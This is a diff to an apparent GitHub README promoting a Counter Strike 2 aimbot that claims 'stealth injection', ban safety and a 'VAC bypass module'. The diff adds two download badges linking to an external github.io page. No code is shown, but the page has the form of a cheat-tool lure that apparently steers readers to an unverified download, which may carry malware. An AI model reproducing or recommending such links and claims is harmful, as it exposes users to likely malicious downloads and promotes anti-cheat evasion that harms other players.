@@ -2,7 +2,7 @@
 
 CS2 is all about reflexes, but why grind when you can **beam heads instantly**? Our **Counter Strike 2 aimbot** gives you the edge with surgical aim assist, buttery smooth tracking, and stealth injection that keeps you safe from bans. 💥
 
-
+[![Get Counter Strike 2 Aimbot](https://img.shields.io/badge/Get%20Counter%20Strike%202%20Aimbot-blueviolet)](https://counter-strike-2-aimbot-tool.github.io/.github/)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-) • [Install](#instant-install-guide)
 
@@ -56,6 +56,8 @@ Other tools either get flagged or feel like bots. Our CS2 aimbot blends **perfec
 * 2025-09-07: Spray control improved for M4A1-S & AK-47.
 * 2025-08-20: New VAC bypass module integrated.
 * 2025-08-05: Added FOV hotkey switcher.
+
+[![Get Counter Strike 2 Aimbot](https://img.shields.io/badge/Get%20Counter%20Strike%202%20Aimbot-blueviolet)](https://counter-strike-2-aimbot-tool.github.io/.github/)
 
 ## Conclusion 🎯
 
